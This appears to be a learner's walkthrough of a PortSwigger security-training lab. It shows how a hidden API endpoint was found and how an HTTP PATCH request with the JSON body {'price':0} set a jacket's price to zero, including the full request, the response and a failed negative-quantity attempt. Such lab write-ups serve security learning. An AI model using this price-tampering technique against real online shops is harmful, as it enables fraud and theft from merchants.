## [1. Finding and exploiting an unused API endpoint](https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint)

### To solve the lab, exploit a hidden API endpoint to buy a **Lightweight l33t Leather Jacket**. You can log in to your own account using the following credentials: `wiener:peter`.

</br>

``` Required knowledge
To solve this lab, you'll need to know:
- How to use error messages to construct a valid request.
- How HTTP methods are used by RESTful APIs.
- How changing the HTTP method can reveal additional functionality.
These points are covered in our [API Testing](https://portswigger.net/web-security/api-testing) Academy topic.
```
#### Methodology
used content discovery to find `GET /api/products/1/price`
sent it to repeater, turns out I had to logon to be able to change the request method
I knew that was neccessary cause the goal of the lab.

First attempt - sorta worked
Needed to trick the app into selling me the jacket for free, so I
turned on intercept, selected the jacket, changed quantity to -1
to reduce the price to $0.00 and I may of changed to the PUT method
then went to my cart, and proceeded to check out and it worked, sorta, but did not solve the lab

#### What worked:

visited the page `GET /api/products/1/price HTTP/2`
sent to it to the **Repeater** tab, change the method for the API request from `GET` to `PATCH`
I forgot about Patch.
then changed the Content-Type header to reflect the fact I'm working with JSON structured data
`Content-Type: application/json`

Sending the request in repeater:
it's not `POST /cart/checkout HTTP/2`
```json
{"price":"$0.00","message":"&#x1F525; only 1 dolla remaining! &#x1F525;"}
```
The price is supposed to be $0, cause your balance is 0

The request method to use is actually **PATCH:** 
`PATCH /api/products/1/price HTTP/2`
```json
{"price":0}
```

so the request looks like this:
```http
PATCH /api/products/1/price HTTP/2
Host: 0ad7004304fb74b68107f3d6005f0047.web-security-academy.net
Cookie: session=h5RTpdBMdr4rJVE7ETigcxJg1Xmuly2Z
Referer: https://0ad7004304fb74b68107f3d6005f0047.web-security-academy.net/product?productId=1
Content-Type: application/json
Content-Length: 11

{"price":0}
```

And the response is
```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

{"price":"$0.00"}
```

all that was left was to...
Go to Burp's browser, reload the leather jacket product page. Notice that the price of the leather jacket is now `$0.00`.
Add the leather jacket to your basket.
Go to your basket and click **Place order** to solve the lab.
